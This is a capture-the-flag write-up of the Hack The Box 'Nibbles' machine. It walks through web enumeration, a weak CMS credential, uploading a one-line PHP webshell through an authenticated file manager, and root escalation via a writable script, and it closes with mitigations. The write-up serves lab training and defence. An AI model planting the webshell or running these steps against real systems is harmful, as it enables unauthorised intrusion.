> [!NOTE]
> **Machine notes.** Credentials and flags are redacted; output is illustrative.
> Complete the machine on Hack The Box for the real values.

## Executive summary

Nibbles is a web-led Linux machine. A CMS login, a weak credential and an
authenticated file manager produce code execution. The privilege step is a
permission review that most people overcomplicate.

The machine's teaching point is that authenticated web features are still attack
surface.

## Machine information

| Field | Value |
| --- | --- |
| Platform | Hack The Box |
| Machine | Nibbles |
| Difficulty | Easy |
| Operating system | Linux |
| Category | Web exploitation, Linux privilege escalation |
| Skills | Web enumeration, CMS access, file upload, local enumeration |

## Objectives

- Enumerate a web application and identify its CMS.
- Discover a credential clue that the page itself exposes.
- Use an authenticated feature to gain execution.
- Escalate using a file permission issue rather than a kernel exploit.

## Tools used

| Tool | Purpose |
| --- | --- |
| `nmap` | Service discovery |
| `gobuster` | Directory enumeration |
| Burp Suite | Request manipulation |
| `linpeas` | Local enumeration (optional) |

## Initial reconnaissance

```bash
nmap -Pn -sV -sC -p- <machine-ip> -oN nmap-nibbles.txt
```

Expect SSH and HTTP. Fetch the landing page and read the HTML source, including
comments:

```bash
curl -s http://<machine-ip>/ | sed -n '1,80p'
```

A comment pointing to a directory is the intended hint, not a mistake.

## Enumeration

```bash
gobuster dir -u http://<machine-ip>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt
```

Then enumerate the discovered path:

```bash
gobuster dir -u http://<machine-ip>/<path>/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
```

Look for:

- `README` or configuration files.
- A login panel.
- An admin directory with a file manager.

## Vulnerability identification

Three issues compose the chain:

1. **Credential exposure.** A file or comment reveals a default or weak password.
2. **Weak authentication.** The credential works and is guessable.
3. **Unrestricted upload.** The authenticated file manager allows executable
   content in a served directory.

Individually: information disclosure, weak authentication, unrestricted upload.
Together: remote code execution.

## Exploitation

Authenticate to the admin panel and locate the file manager. Upload a small PHP
webshell:

```php
<?php echo system($_GET['cmd']); ?>
```

Request it and confirm execution:

```bash
curl -s 'http://<machine-ip>/<upload-path>/<file>.php?cmd=id'
```

That output is the finding's evidence. Keep the command read-only.

## Privilege escalation

Enumerate as the web user:

```bash
id
sudo -l
ls -la /home
find / -perm -4000 -type f 2>/dev/null
```

The intended path is a script or file in the user's home that is writable and
executed with higher privilege — a classic permission review rather than a kernel
bug.

Verify before using:

```bash
ls -l <script>
stat <script>
```

If a scheduled job executes it as root, a modification takes effect on the next
run. Do not install a persistent backdoor; demonstrate with a single command and
revert.

> [!TIP]
> When `linpeas` prints a hundred lines, look for the three that mention your user,
> your home directory, or a writable path outside `/tmp`. That is usually the
> intended route.

## Flags and completion evidence

Flags are redacted. Record:

- The exposed clue and where it was.
- The upload path and filename.
- The writable file and its owner/mode.

## Lessons learned

- HTML comments are part of the attack surface.
- Authenticated features deserve the same testing as public ones.
- Upload restrictions must be enforced by content and storage location.
- Permission reviews beat kernel exploits for stability.

## Mitigation and remediation

| Issue | Control |
| --- | --- |
| Exposed credentials in files | Remove; rotate; use a secret store |
| Weak authentication | Strong password policy, MFA |
| Unrestricted upload | Content validation, non-executable storage |
| Writable scripts run as root | Correct ownership and permissions |

## References

- Hack The Box — Nibbles.
- OWASP — File Upload Cheat Sheet.
- GTFOBins — local escalation reference.
